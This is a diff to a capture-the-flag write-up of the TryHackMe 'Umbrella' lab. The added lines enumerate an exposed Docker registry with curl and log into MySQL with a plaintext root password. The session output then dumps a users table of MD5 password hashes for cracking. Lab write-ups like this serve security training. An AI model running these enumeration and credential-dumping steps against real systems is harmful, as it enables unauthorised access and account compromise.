@@ -44,6 +44,10 @@ room link: https://tryhackme.com/room/umbrella
 
 ## Docker 
 
+[5000 - Pentesting Docker Registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)
+
+Docker registry may be configured to use HTTP or HTTPS. So the first thing you may need to do is find which one is being configured:
+
 `curl -s http://10.10.197.203:5000/v2/_catalog`
  
     {"repositories":["umbrella/timetracking"]}
@@ -219,4 +223,54 @@ room link: https://tryhackme.com/room/umbrella
        ]
     }                                                                                                                    
 
+## MySQL Access and Hash Cracking
+
+Access MySQL databases, password for mysql `Ng1-f3!Pe7-e5?Nf3xe5`
+
+`mysql -h umbrella.thm -u root -p`
+
+    Welcome to the MariaDB monitor.  Commands end with ; or \g.
+    Your MySQL connection id is 6
+    Server version: 5.7.40 MySQL Community Server (GPL)
     
+    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+    
+    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+    
+    MySQL [(none)]> show databases;
+    +--------------------+
+    | Database           |
+    +--------------------+
+    | information_schema |
+    | mysql              |
+    | performance_schema |
+    | sys                |
+    | timetracking       |
+    +--------------------+
+    5 rows in set (0.120 sec)
+    
+    MySQL [(none)]> use timetracking;
+    Reading table information for completion of table and column names
+    You can turn off this feature to get a quicker startup with -A
+    
+    Database changed
+    MySQL [timetracking]> show tables;
+    +------------------------+
+    | Tables_in_timetracking |
+    +------------------------+
+    | users                  |
+    +------------------------+
+    1 row in set (0.120 sec)
+    
+    MySQL [timetracking]> select * from users;
+    +----------+----------------------------------+-------+
+    | user     | pass                             | time  |
+    +----------+----------------------------------+-------+
+    | claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
+    | chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
+    | jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
+    | barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
+    +----------+----------------------------------+-------+
+    4 rows in set (0.119 sec)
+
+
